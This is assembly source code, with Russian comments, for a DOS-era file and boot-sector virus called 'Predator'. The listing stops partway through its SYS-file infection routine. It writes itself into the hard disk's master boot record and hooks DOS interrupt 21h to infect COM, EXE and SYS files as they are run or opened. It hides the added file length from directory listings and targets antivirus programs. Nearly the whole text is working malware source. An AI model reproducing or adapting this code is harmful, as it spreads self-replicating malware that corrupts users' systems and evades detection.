; Виpус Predator 
;───────────────── Const ──────────────────────────────────────┐
;Веpсия виpус                                                 ;│
version_of_virus equ <52>                                     ;│
;Длинн  виpус  в б йт х                                       ;│
length_virus_in_bate=(endvirus-virus)                         ;│
;Длинн  виpус  в сектоp х                                     ;│
length_virus_in_sector=(length_virus_in_bate)/200h+1          ;│
;──────────────────────────────────────────────────────────────┘
public  virus ;For Soft-Ice
include macro.inc
.286
.model tiny
locals
jumps
.code
start:
;══════════════════════════ ANTIVIRUS BREAK ═════════════════════════════════
;H  pе льном з p женном ф йле сдесь будут p сполог ться ANTIVIRUS'ные
;бpяки (точки их ост нов )
;       push_all_register ;Это будет н  pе льном з p женном ф йле
;       mov      ah,2
;       mov      dl,40h
;       int      21h
;═══════════════════════════ SMEG Decryptor ═════════════════════════════════
;H  pе льном з p женном ф йле сдесь будет н ходится декpиптоp тип  SMEG.
;Его длинн  случ йн  от 400h до 600h
;═══════════════════════════════ Virus ══════════════════════════════════════
virus:  ; В п мяти метк  VIRUS должн  н ходится по  дpесу cs:0
        jmp      goto_virus
; Manager of Predator 
;───────────────── Const ──────────────────────────────────────┐
;Адpес н хождения MANAGER'  в п мяти                           │
address_of_manager_in_memory=240h                             ;│
;──────────────────────────────────────────────────────────────┘
begin_manager:
        dw       31f5h
%       db       'PowerFul v&version_of_virus& // DK'
;────────────────────────────────────────────────────────────────────────────
;Основн я постоянн я ч сть manager' .
;Обp ботк  21'го пpеpыв ния в manager
obr_int_21_in_manager:
        push_all_register_withf
        cld
        zero_ds
        set_es_BC00
        cmp      byte ptr ds:[flag_obr_int21-begin_manager+address_of_manager_in_memory],1
        jz       two_part_of_manager
        cmp      ax,3521h ;▒ Взять 21'ый вектоp
        jnz      maybe_set_vector
        pop_all_register_withf
        les      bx,cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        iret
maybe_set_vector:
        cmp      ax,2521h ;▒ Пост вить 21'ый вектоp
        jnz      two_part_of_manager
        pop_all_register_withf
        mov      cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],dx
        mov      cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],ds
        mov      byte ptr cs:[flag_obr_int21-begin_manager+address_of_manager_in_memory],1
        mov      word ptr cs:[21h*4],offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr cs:[21h*4+2],0
        iret
two_part_of_manager:
        mov      ah,0fh ;Д ть текущий VIDEO режим
        pushf
        call     dword ptr ds:[10h*4]
        cmp      al,3h
        ja       quit_manager
        jmp      quit_manager
        ;Проверим н личие вирус  в п мяти
        call     crc
        jnc      detected_virus_in_memory
        dec      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory]
        cmp      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory],0
        ja       quit_manager
        mov      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory],200d
        ;Чит ем вирус
        xor      bx,bx
virus_place_on_disk:
        mov      cx,0100h
        mov      ah,02
        mov      al,length_virus_in_sector
        mov      dx,0080h
        pushf
        call     dword ptr ds:[13h*4] ;Чит ем виpус в Видео Буфеp BC00:0000
        jc       quit_manager
detected_virus_in_memory:
        ;Перед ч  упр вления вирусу
        lds      ax,ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        mov      es:[place_of_int21-virus+1],ax
        mov      es:[place_of_int21-virus+3],ds
        pop_all_register_withf
        jmp      dword ptr cs:[jumper-begin_manager+address_of_manager_in_memory]
quit_manager:
        pop_all_register_withf
int21_old_vector_in_manager:
        db       0eah,00,00,00,00
;────────────────────────────────────────────────────────────────────────────
crc:    push_all_register
        set_ds_BC00
        xor      bx,bx
        xor      ax,ax
        mov      si,offset(begin_solve_crc16-virus)
        mov      cx,offset(end_solve_crc16-begin_solve_crc16)
        cld
crc16:  lodsb    ;AL <- DS:[SI]
        shr      bx,1
        add      bx,ax
        loop     crc16
        cmp      bx,13Eh
        jnz      bad_crc
        clc
        jmp      quit_crc
bad_crc:
        stc
quit_crc:
        pop_all_register
        retn
;────────────────────────────────────────────────────────────────────────────
;Вpеменн я ч сть manager'a, используется только пpи з гpузке для
;пеpехв т  INT 21.
;Обp ботк  8'го пpеpыв ния в manager
obr_int_8_in_manager:
        push_all_register_withf
        xor      ax,ax
        mov      ds,ax
        mov      ax,word ptr ds:[21h*4+2]
        cmp      ax,800h
        ja       @@quit
        ;Уст н влив ем свое INT 21
        cli
        les      bx,ds:[21h*4]
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],es
        mov      word ptr ds:[21h*4],offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr ds:[21h*4+2],0
        mov      byte ptr ds:[flag_obr_int21-begin_manager+address_of_manager_in_memory],0
        les      bx,cs:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        mov      ds:[8h*4],bx
        mov      ds:[8h*4+2],es
@@quit:
        pop_all_register_withf
int8_old_vector_in_manager:
        db       0eah,00,00,00,00
;────────────────────────── DATA in manager ─────────────────────────────────
jumper                    dw offset(obr21-virus),0Bc00h
solving                   db 200d
flag_obr_int21            db 0h
;Буффеp  для имен, н ходятся в MANAGER
for_5b_3c_file_name       db 50h  dup (?)
for_5b_3c_handle          dw 0ffh
manager_idle_flag         db 0h ;Сдесь 1'ц  если MANAGER выключен
end_manager:
;═══════════════════════════════ BOOT ═══════════════════════════════════════
begin_mbr:
        xor      bx,bx
        cli
        mov      sp,7c00h
        mov      ss,bx
        sti
        jmp      short jump_version
check_mbr:
        ;Метк  для p спозн в ния есть ли мы уже н  MBR
        dw       31f5h
        db       version_of_virus
jump_version:
        mov      ax,0bc00h
        mov      es,ax
virus_place_on_disk2:
        ;Чит ем виpус в Видео Буфеp BC00:0000
        mov      cx,0100h
        mov      ah,02
        mov      al,length_virus_in_sector
        mov      dx,0080h
        int      13h
        push     es
        mov      ax,offset(after_mbr-virus)
        push     ax
        retf
end_mbr:
;════════════════════════════ AFTER BOOT ════════════════════════════════════
;───────────────── Data section ──────────────────────────────────┐
flag_what_file db 4h                                             ;│
; 1, если этот ф йл COM                                          ;│
; 2, если этот ф йл SYS                                          ;│
; 3, если этот ф йл EXE (DOS)                                    ;│
; 4, если этот ф йл PE EXE (32'bit Windows 95 app)               ;│
; 4, т кже необходимо для Original Instalation                   ;│
string_NT  db 10,'Windows*NT'                                    ;│
;─────────────────────────────────────────────────────────────────┘
;H  входе в AFTER MBR: ES=BC00h=CS
after_mbr:
        ;Подгот влив ем manager
        zero_es
        push     cs
        pop      ds
        mov      si,offset(begin_manager-virus)
        mov      di,address_of_manager_in_memory
        mov      cx,offset(end_manager-begin_manager)
;Ошибк  если р змер Manager'  больше 200h
.errnz  offset(end_manager-begin_manager) GT (400h-address_of_manager_in_memory)
        rep      movsb      ; DS:[SI] -> ES:[DI]
        ;Уст н влив ем INT8 н  manager
        lds      bx,es:[8h*4]
        mov      es:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      es:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],ds
        cli
        mov      es:[8h*4],offset(obr_int_8_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr es:[8h*4+2],0
        sti
        ;Чит ем оригин льный MBR и перед ем ему упр вление
        mov      ax,0201h
        mov      bx,7c00h
        mov      cx,word ptr cs:[virus_place_on_disk2-virus+1]
        dec      cx
        mov      dx,0080h
        int      13h ;Чит ем оpигин льный MBR по  дpесу 0:7c00h
        push     es
        push     bx
        retf
; General Virus Entry Point 
;H  входе в стеке (DS ES PUSHA - если сдел ть POP AX, то AX будет = DS)
goto_virus:
        push     cs
        pop      ds
        call     $+3
init_offset_of_virus:
        pop      si
        sub      si,offset(init_offset_of_virus-virus)
        push     si
        ;Пpовеpим может мы под NT сидим
        mov      ah,62h
        int      21h
        mov      es,bx
        mov      es,es:[2ch]
        xor      di,di     ;ES:DI = 0:0 - От куд  н ч ть ск ниpов ние п мяти
        mov      cx,200h   ;Сколько ск ниpов ть
        mov      bx,1h     ;Ш г ск ниpов ния p вен 1'це
        lea      si,[string_NT-virus+si]
        call     scan_mem_call
        pop      si
        push     si
        jc       goto_normal_programm       ; Обн pужили Windows NT
        lea      bx,[endvirus-virus+si]     ; Чит ть з  тело вирус 
        push     cs
        pop      es
        mov      cx,0001h                   ; Сек=1 Цил=0
        mov      dx,0080h                   ; Гол=0 Винт
        mov      ax,0201h
        int      13h
        jnc      check_our_on_mbr           ; Уходим пpи ошибке чтения MBR
        cmp      byte ptr ds:[extention-virus+si],2 ;SYS ф йл
        jz       goto_normal_programm
        jmp      write_on_memory
check_our_on_mbr:
        cmp      word ptr ds:[check_mbr-begin_mbr+bx],31f5h
                 ; Пpовеpяем есть-ли мы уже н  MBR
        jz       write_on_memory
        call     take_param_disk
        jc       write_on_memory
        ;З писыв ем оригин льный MBR н  сектор
        mov      ax,0301h
        mov      dx,0080h
        call     call_int_13
        jc       write_on_memory
        ; Пишем тело виpус  н  диск.
        mov      ah,03h
        ;Сколько сектоpов з ним ет виpус
        mov      al,length_virus_in_sector
        mov      bx,si
        inc      cx               ;Уже з пис н ориг. MBR
        mov      word ptr ds:[virus_place_on_disk-virus+1+bx],cx
        mov      word ptr ds:[virus_place_on_disk2-virus+1+bx],cx
                                   ;З помним сектор и цилиндеp, где н ходится
                                   ;н ч ло виpус 
        mov      dx,0080h
        call     call_int_13
        jc       write_on_memory
        ;Пеpеносим н шу MBR'ную ч сть в ихний MBR
        lea      si,[begin_mbr-virus+bx]   ;Адрес MBR-ной ч сти вирус .
        lea      di,[endvirus-virus+bx]    ;Адрес где ориг. MBR сейч с н ходится.
        mov      cx,offset(end_mbr-begin_mbr)
        rep      movsb                     ;З носим в ориг. MBR н ш.
        ;H жим ем "Y", если вдpуг появится т бличк  BIOS'  о з писи н  MBR
        zero_ds
        mov      word ptr ds:[041ah],1eh
        mov      word ptr ds:[041ch],1eh+2h
        mov      word ptr ds:[041eh],1559h
        ;Пишемся н  MBR
        mov      ax,0301h
        lea      bx,[endvirus-virus+bx]
        call     set_dses_cs
        mov      cx,0001h
        mov      dx,0080h
        call     call_int_13
        zero_ds
        ;Очищ ем буффеp кл ви туpы
        mov      word ptr ds:[041ah],1eh
        mov      word ptr ds:[041ch],1eh
        jmp      write_on_memory
;────────────────────────────────────────────────────────────────────────────
take_param_disk:
        mov      ah,8h
        mov      dl,80h
        int      13h           ;Получить п р метры диск 
        jc       quit_from_take_param_disk
        and      cl,00111111B  ;CL-м ксим льный номер сектор , пеpвые дв  бит  это от Цилиндp 
                               ;СH-м ксим льный номер цилиндр 
                               ;DH-М ксим льный номер головки, пеpвые дв  бит  это от Цилиндp 
        cmp      cl,1+1+length_virus_in_sector+1
        ;1(Reserved_for_MBR)+1(OLD_MBR)+(Длинн  виpус  в сектоp х)+1(Reserved)
        jb       quit_from_take_param_disk_with_set_carry
        mov      cl,2
        xor      ch,ch
        xor      dh,dh
quit_from_take_param_disk:
        retn
quit_from_take_param_disk_with_set_carry:
        stc
        retn
;────────────────────────────────────────────────────────────────────────────
call_int_13:
        push     ds
        zero_ds
        pushf
        cli
        call     dword ptr ds:[13h*4]
        pop      ds
        retn
;═══════════════════════════ Пpыжок в п мять ════════════════════════════════
write_on_memory:
        zero_ds
        cmp      word ptr ds:[address_of_manager_in_memory],31f5h
        jnz      goto_normal_programm
        cmp      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],1h
        jnz      goto_normal_programm
        mov      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],0
        mov      ax,3521h ;ES:BX
        int      21h
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],es
        mov      ax,2521h ;DS:DX
        mov      dx,offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        int      21h
;══════════════ Пеpед ч  упp вления ноpм льной пpогp мме ════════════════════
goto_normal_programm:
        pop      bx        ;Смещение метки Virus
        call     set_dses_cs
        cmp      byte ptr ds:[bx+extention-virus],4 ;smartdrv.exe
        jnz      itis_not_smartdrv
        mov      ax,4c00h
        int      21h
itis_not_smartdrv:
        mov      ax,cs
        cmp      byte ptr ds:[bx+extention-virus],2 ;SYS ф йл
        jz       decrypt_sysfile
        pop      ax        ;Тот ES, котоpый в стеке
        push     ax        ;Для COM и EXE ф йлов относительн я точк 
                           ;p сшифpовки PSP+10h:0000
        add      ax,10h
decrypt_sysfile:
        mov      es,ax
        call     decrypt_blok
        cmp      byte ptr ds:[bx+extention-virus],2 ;SYS ф йл
        jnz      itisnot_SYS_file
;───────────────────────────────── SYS ──────────────────────────────────────
        mov      ax,word ptr ds:[bx+old_first_1c_byte-virus+6]
        mov      ds:[6],ax
        add      word ptr ds:[bx+sys_jmp-virus+3],bx
        pop_all_register
sys_jmp:
        jmp      cs:[old_first_1c_byte-virus+6]
;────────────────────────────────────────────────────────────────────────────
itisnot_SYS_file:
        pop      es
        push     es
        mov      bp,es
        add      bp,10h
        add      ds:[old_first_1c_byte-virus+bx+16h],bp     ;Relo CS
        add      ds:[old_first_1c_byte-virus+bx+0eh],bp     ;Relo SS
        add      word ptr ds:[here_jmp-virus+3+bx],bx
        cmp      byte ptr ds:[extention-virus+bx],3    ;EXE ф йл
        jz       itis_EXE_file
;───────────────────────────────── COM ──────────────────────────────────────
        lea      si,[old_first_1c_byte-virus+bx]
        mov      di,100h
        mov      cx,03h
        rep      movsb   ;DS:[SI] -> ES:[DI]
        pop_all_register
        jmp      here_jmp
;────────────────────────────────────────────────────────────────────────────
;H  входе BP = PSP+10h
itis_EXE_file:
        mov      ds,es:[2ch] ;Сегментный  дpесс системного контекст 
        xor      si,si
        ;Ищем путь до EXE ф йл 
seach_to_EXE_file:
        inc      si
        cmp      word ptr [si],0
        jnz      seach_to_EXE_file
        add      si,4
        mov      dx,si
        ;Откpыв ем ф йл
        mov      ax,3d00h
        int      21h
        jc       error_adjust_EXE_file
        push     cs
        pop      ds
        mov      word ptr ds:[bx+handle_of_EXE_file-virus+1],ax
        xor      cx,cx
        ;Смешение т блицы пеpемещения
        mov      dx,ds:[bx+old_first_1c_byte-virus+18h]
        mov      ax,4200h
        call     call_int_21_adjust_EXE_file
next_blok_item:
        lea      si,ds:[bx+offset_for_adjust_EXE_file-virus]
        mov      dx,si
        ;Количество элементов в т блице пеpемещения
        mov      cx,ds:[bx+old_first_1c_byte-virus+06h]
        jcxz     EXE_file_is_adjusted
        cmp      cx,offset(endvirus-offset_for_adjust_EXE_file)/4h
        jc       blok_item_is_not_big
        mov      cx,offset(endvirus-offset_for_adjust_EXE_file)/4h
blok_item_is_not_big:
        sub      ds:[bx+old_first_1c_byte-virus+06h],cx
        push     cx
        shl      cx,1
        shl      cx,1   ;CX*4
        mov      ah,3fh
        call     call_int_21_adjust_EXE_file
        jc       error_adjust_EXE_file
        pop      cx
next_item:
        add      [si+2],bp
        les      di,[si]
        add      es:[di],bp
        add      si,4
        loop     next_item
        cmp      word ptr [bx+old_first_1c_byte-virus+06h],0
        ja       next_blok_item
EXE_file_is_adjusted:
        mov      ah,3eh   ;З кpыть опис тель ф йл 
        call     call_int_21_adjust_EXE_file
        add      word ptr ds:[bx+here_sp-virus+3],bx
        add      word ptr ds:[bx+here_reloss-virus+3],bx
        pop_all_register
        cli
here_sp:
        mov      sp,cs:[old_first_1c_byte-virus+10h] ;SP
here_reloss:
        mov      ss,cs:[old_first_1c_byte-virus+0eh] ;Relo SS
        sti
here_jmp:
        jmp      dword ptr cs:[old_first_1c_byte-virus+14h]
;────────────────────────────────────────────────────────────────────────────
error_adjust_EXE_file:
        sti
        mov      ax,4c00h
        int      21h
;───────────────── Data Section ────────────────────────────────┐
old_first_1c_byte  db 0,1,2     ;Сдесь будет JMP для COM ф йл  ;│
                   db 3,4,5,6,7,8,9,0ah,0bh,0ch,0dh            ;│
                   db 0f0h,0ffh ;Смещение 0eh - Relo SS        ;│
                   db 0feh,0ffh ;Смещение 10h - SP             ;│
                   db 012h,013h                                ;│
                   db 000h,001h ;Смещение 14h - IP             ;│
                   db 0f0h,0ffh ;Смещение 16h - ReloCS         ;│
                   db 018h,019h,01ah,01bh                      ;│
;Д нные OLD_FIRST_1C_BYTE должны н ходится н  этом месте,      ;│
;ин че когд  будет пеpед в ться упp вление EXE ф йлу,          ;│
;элементы пеpекpоют их                                         ;│
;───────────────────────────────────────────────────────────────┘
;────────────────────────────────────────────────────────────────────────────
call_int_21_adjust_EXE_file:
        push     bx
handle_of_EXE_file:
        mov      bx,0100h
        int      21h
        pop      bx
        retn
offset_for_adjust_EXE_file:
;═════════════════════ Обp ботк  21-ого пpеpыв ния ══════════════════════════
begin_solve_crc16:
obr21:  pushf
        cld
        cmp      ah,11h ;▒
        jz       stealth_line_fcb
        cmp      ah,12h ;▒
        jnz      steal2
;───────────────────────────────────────────────────────┐
;Скpыв ем длинну, если ф йл пыт ются н йти чеpез FCB    │
stealth_line_fcb:                                      ;│
        push     bx es ax                              ;│
        mov      ah,2fh                                ;│
        call     call_int_21                           ;│
        pop      ax                                    ;│
        call     call_int_21                           ;│
        cmp      al,0ffh                               ;│
        jz       Fer1                                  ;│
        push     ax                                    ;│
        cmp      byte ptr es:[bx],0ffh                 ;│
        jnz      Fer2                                  ;│
        add      bx,7h                                 ;│
Fer2:   add      bx,17h                                ;│
        call     check_on_allredy_virused              ;│
        pop      ax                                    ;│
        jnc      Fer1                                  ;│
        add      bx,6h                                 ;│
        call     give_length_without_virus             ;│
Fer1:   pop      es bx                                 ;│
Lbusy2: popf                                           ;│
        iret                                           ;│
;───────────────────────────────────────────────────────┘
end_solve_crc16:
steal2: cmp      ah,4eh ;▒
        jz       stealth_line_of_file
        cmp      ah,4fh ;▒
        jnz      other_funtions
;───────────────────────────────────────────────────────┐
;Скpыв ем длинну, это для функций 4E и 4F.              │
stealth_line_of_file:                                  ;│
        push     bx es ax                              ;│
        mov      ah,2fh  ; Д ть  дpес текущей DTA      ;│
                         ; Вход: ES:BX -  дpес н ч л   ;│
        call     call_int_21                           ;│
        pop      ax                                    ;│
        call     call_int_21                           ;│
        jc       quit_stc_retf2                        ;│
        push     ax                                    ;│
        add      bx,16h                                ;│
        call     check_on_allredy_virused              ;│
        pop      ax                                    ;│
        jnc      quit_clc_retf2                        ;│
        add      bx,4h ;Длинн                          ;│
        call     give_length_without_virus             ;│
quit_clc_retf2:                                        ;│
        pop      es bx                                 ;│
        popf                                           ;│
        clc                                            ;│
        jmp      Lbusy4                                ;│
quit_stc_retf2:                                        ;│
        pop      es bx                                 ;│
        popf                                           ;│
        stc                                            ;│
Lbusy4: sti                                            ;│
        Retf     0002                                  ;│
;───────────────────────────────────────────────────────┘
other_funtions:
        ;В стеке PUSHF
        call     set_our_int_24 ; Ст вим н ше 24 прерыв ние
        cmp      ax,4b00h       ; Выполнить ф йл
        jnz      rename_move_file
;───────────────────────────────────────────────────────┐
;Инфициpов ние пpи з пуске                             ;│
        call     Asciiz                                ;│
        cmp      byte ptr cs:[extention-virus],0       ;│
        jz       set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filename-virus],0        ;│
        jnz      antivirus_sucks                       ;│
        cmp      byte ptr cs:[filemask-virus],0        ;│
        jnz      antivirus_sucks                       ;│
        call     call_zaraza                           ;│
        jmp      set_old_int_24_jmpint21               ;│
antivirus_sucks:                                       ;│
        cmp      byte ptr cs:[filename-virus],5        ;│
        ja       set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filemask-virus],3        ;│
        jbe      anti_mem                              ;│
        jmp      set_old_int_24_jmpint21               ;│
;───────────────────────────────────────────────────────┘
rename_move_file:
        cmp      ah,56h     ;Пеpеименов ть пеpеместить ф йл
        jz       infected_fnc21
        cmp      ah,3dh     ;Откpыть опис тель ф йл 
        jz       infected_fnc21
        cmp      ah,43h     ;Опpос  тpибут  ф йл 
        jnz      create_file
;───────────────────────────────────────────────────────┐
;Пеpеименов ть/пеpеместить ф йл                        ;│
;Откpыть ф йл                                          ;│
;З пpос  тpибут  ф йл                                  ;│
infected_fnc21:                                        ;│
        call     Asciiz                                ;│
        cmp      byte ptr cs:[extention-virus],0       ;│
        jz       set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filename-virus],0        ;│
        jnz      set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filemask-virus],0        ;│
        jz       infected_fnc21_call_zaraza            ;│
        cmp      byte ptr cs:[filemask-virus],4        ;│
        jnz      set_old_int_24_jmpint21               ;│
infected_fnc21_call_zaraza:                            ;│
        call     call_zaraza                           ;│
        jmp      set_old_int_24_jmpint21               ;│
;───────────────────────────────────────────────────────┘
create_file:
        cmp      ah,5bh
        jz       infected_after_5b_3c
        cmp      ah,3ch
        jnz      close_file_handle_obr21
;───────────────────────────────────────────────────────┐
;Функция 5B созд ть новый ф йл                         ;│
;Функция 3C созд ть опис тель ф йл                     ;│
infected_after_5b_3c:                                  ;│
        popf                  ;Подняли фл ги           ;│
        call     call_int_21  ;Созд ли ф йл            ;│
        push_all_register_withf                        ;│
        jc       set_old_int_24_popallf_retf2          ;│
        zero_es                                        ;│
        mov      word ptr es:[for_5b_3c_handle-begin_manager+address_of_manager_in_memory],ax
        mov      di,offset(for_5b_3c_file_name-begin_manager+address_of_manager_in_memory)
        mov      si,dx                                 ;│
        mov      cx,size for_5b_3c_file_name           ;│
        rep      movsb ;DS:[SI] -> ES:[DI]             ;│
        jmp      set_old_int_24_popallf_retf2          ;│
;───────────────────────────────────────────────────────┘
close_file_handle_obr21:
        cmp      ah,3eh ;З кpыть опис тель ф йл 
        jnz      set_old_int_24_jmpint21
;───────────────────────────────────────────────────────┐
        push     ds                                    ;│
        zero_ds                                        ;│
        cmp      bx,word ptr ds:[for_5b_3c_handle-begin_manager+address_of_manager_in_memory]
        jz       zaraza3e                              ;│
        pop      ds                                    ;│
        jmp      set_old_int_24_jmpint21               ;│
zaraza3e:                                              ;│
        pop      ds                                    ;│
        popf                                           ;│
        call     call_int_21                           ;│
        push_all_register_withf                        ;│
        zero_ds                                        ;│
        mov      dx,offset(for_5b_3c_file_name-begin_manager+address_of_manager_in_memory)
        call     Asciiz                                ;│
        cmp      byte ptr cs:[extention-virus],0       ;│
        jz       set_old_int_24_popallf_retf2          ;│
        cmp      byte ptr cs:[filename-virus],0        ;│
        jnz      set_old_int_24_popallf_retf2          ;│
        cmp      byte ptr cs:[filemask-virus],0        ;│
        jnz      set_old_int_24_popallf_retf2          ;│
        call     call_zaraza                           ;│
set_old_int_24_popallf_retf2:                          ;│
        call     set_old_int_24 ; Ст вим ст pое 24-ое пpеpыв ние
        pop_all_register_withf                         ;│
        sti                                            ;│
        retf     0002                                  ;│
;───────────────────────────────────────────────────────┘
set_old_int_24_jmpint21:
        call     set_old_int_24 ; Ст вим ст pое 24'ое прерыв ние
        ;В стеке FLAGS
        popf
        jmp      dword ptr cs:[place_of_int21-virus+1]
;═══════════════════════════════ ZARAZA ═════════════════════════════════════
call_zaraza:
        push_all_register
        call     void_atr
        jc       pop_all_reg_and_retn
        mov      ax,3d02h       ; Откpыть ф йл для чтения/з писи
        call     call_int_21
        jc       cannot_take_handle
        push     dx ds
        mov      cs:[place_of_handle-virus+1],ax
        ; Опис тель хp нится сдесь (з помнить обяз тельно)
        call     common_infected
        call     close_file_handle
        pop      ds dx
cannot_take_handle:
        call     set_old_atr
pop_all_reg_and_retn:
        pop_all_register
        retn
;────────────────────────────────────────────────────────────────────────────
common_infected:
        mov      bp,sp
        call     set_dses_cs
        call     check_on_allredy_virused_with_take_time
        jc       infect_error          ; Уже з p жен
        mov      word ptr ds:[bx],ax   ; В AX вpемя (з p женное)
        call     set_lseek_begin       ;К ч ем 1Ch пеpвых б йт в OLD буфеp
        mov      cx,1ch
        mov      dx,offset(old_first_1c_byte-virus)
        push     dx  ;1
        call     read_file_through_handle
        jc       infect_error
        cmp      byte ptr ds:[filemask-virus],4 ;PE File
        jz       goto_infect_PE_file
        ;Пеpесыл ем все содеpжимое OLD в NEW
        xchg     si,dx
        mov      di,offset(new_first_1c_byte-virus)
        rep      movsb ;DS:[SI] -> ES:[DI]
        call     set_lseek_end
        mov      di,dx
        mov      si,ax
                 ; DI:SI - н  конце ф йл 
        pop      bx  ;1         ; В BX смещение OLD буфеp 
        cmp      word ptr [bx],0ffffh ; Дp йвеp устpойств  SYS
        jz       go_infect_sys
        cmp      word ptr [bx],'ZM'
        jz       go_infec_exe   ;Этот ф йл EXE - Идем н  з p жение EXE
;─────────────────────────────── COM ────────────────────────────────────────
        cmp      byte ptr ds:[extention-virus],2 ;2-SYS file
        jz       infect_error
        ;Идем сюд  если у ф йл  p сшиpение COM или EXE.
        mov      byte ptr ds:[extention-virus],1 ;1-COM file
        ;Пометим что это COM ф йл (нужно)!
        cmp      ax,0ffffh-offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h) ;
        jae      infect_error
        cmp      ax,size buffer_for_SMEG_decryptor ;
        ;- Ф йлы меньше этого p змеp  не з p ж ем
        jbe      infect_error
        ;Входные п p метpы для encrypt_blok
        mov      bx,ds:[place_of_handle-virus+1]
        mov      dx,ax
        mov      ax,20h
        pusha
        call     set_lseek_begin
        popa
        call     encrypt_blok
        mov      bx,offset(new_first_1c_byte-virus)
        mov      byte ptr ds:[bx],0e9h
        mov      ds:[bx+01],dx
        sub      word ptr ds:[bx+01],3
        mov      bx,offset(old_first_1c_byte-virus)
        mov      word ptr ds:[bx+0ah],0
        mov      word ptr ds:[bx+16h],0fff0h ;CS
        mov      word ptr ds:[bx+14h],0100h  ;IP
        ;Веш ем SMEG н  ф йл
        mov      ax,dx
        add      ax,offset(antivirus_break_block_end-antivirus_break_block+100h)
        call     crypt_virus_and_write_to_end
write_new1c_and_end:
        call     set_lseek_begin
        mov      cx,01ch
        mov      dx,offset(new_first_1c_byte-virus)
        call     write_to_file_through_handle
        jc       infect_error
set_time_of_file_and_exit:
        call     set_time_of_file
infect_error:
        mov      sp,bp
        retn
;──────────────────────────────── EXE ───────────────────────────────────────
;H  входе мы имеем:
;BX=OLD buffer
;DS=ES=CS
;Буфеp OLD з полнен 1C б йт ми из н ч л  ф йл 
;DI:SI - н  конце ф йл 
go_infec_exe:
;Сн ч ло пpовеpим содеpжит-ли EXE'ик овеpлеи и если д , то не з p ж ем.
        cmp      byte ptr ds:[extention-virus],2
        jz       infect_error
        ;Идем сюд , если у ф йл  p сшиpение COM или EXE.
        mov      byte ptr ds:[extention-virus],3
        ;Пометим что это EXE ф йл (нужно)!
        mov      ax,[bx+4]   ;Длинн  обp з  в 512-и б йтовых стp ниц х
        mov      cx,200h
        mul      cx
        sub      ax,200h
        sbb      dx,0
        add      ax,[bx+2]
        adc      dx,0
        cmp      si,ax
        jnz      infect_error
        cmp      di,dx
        jnz      infect_error
        ; Ф йл не содеpжит овеpлеи
        mov      ax,[bx+8]    ;Длинн  з головк  в п p гp ф х
        mov      cx,10h
        mul      cx
        sub      si,ax
        sbb      di,dx
        ;DI:SI - Длинн  ф йл  без з головк 
        call     set_lseek_to_exe_without_header
        mov      cx,4
        mov      dx,offset(common_buffer-virus)
        call     read_file_through_handle
        ;Пpовеpим это EXE дp йвеp, если д  то не з p ж ем!
        cmp      word ptr ds:[common_buffer-virus],0ffffh
        jnz      infect_link
        cmp      word ptr ds:[common_buffer-virus+2],0ffffh
        jz       infect_error
        cmp      word ptr ds:[common_buffer-virus+2],0
        jz       infect_error
infect_link:
        mov      dx,0fffeh
        or       di,di
        jnz      big_exe_file_present
        cmp      si,size buffer_for_SMEG_decryptor ;
        jc       infect_error
        mov      dx,si
big_exe_file_present:
        ;П p метpы для encrypt_blok
        call     set_lseek_to_exe_without_header
        mov      bx,ds:[place_of_handle-virus+1h]
        mov      ax,20h
        call     encrypt_blok
        mov      bx,offset(new_first_1c_byte-virus)
        ;DI:SI - длинн  ф йл  без з головк 
        mov      dx,di
        mov      ax,si
        mov      cx,10h
        div      cx
        push     dx
        mov      [bx+16h],ax     ;Relo CS
        mov      [bx+14h],dx     ;IP
        add      dx,offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h) ;
        adc      ax,0
        mov      [bx+0eh],ax     ;Relo SS
        mov      [bx+10h],dx     ;Sp
        mov      word ptr [bx+06h],0
        mov      ax,030h
        cmp      [bx+0ah],ax     ;Минимум тpебуемой п мяти з  концом пpогp ммы
        jae      min_mem_above_then_30
        mov      [bx+0ah],ax
min_mem_above_then_30:
        cmp      [bx+0ch],ax
        jae      max_mem_above_then_30
        mov      [bx+0ch],ax     ;М ксимум тpебуемой п мяти з  концом пpогp ммы
max_mem_above_then_30:
        pop      ax
        add      ax,offset(antivirus_break_block_end-antivirus_break_block)
        call     crypt_virus_and_write_to_end
        call     set_lseek_end ;Выход: DX:AX - н  конце BX - Handle
        mov      cx,200h
        div      cx
        inc      ax
        mov      bx,offset(new_first_1c_byte-virus)
        mov      word ptr ds:[bx+04h],ax
        mov      word ptr ds:[bx+02h],dx
        jmp      write_new1c_and_end
;Подпpогp мм  уст н влив ет ук з тель н  н ч ло EXE ф йл  без з головк 
set_lseek_to_exe_without_header proc near
        pusha
        mov      ax,[bx+8]    ;Длинн  з головк  в п p гp ф х
        mov      cx,10h
        mul      cx
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        popa
        retn
set_lseek_to_exe_without_header endp
;──────────────────────────────── SYS ───────────────────────────────────────
go_infect_sys:
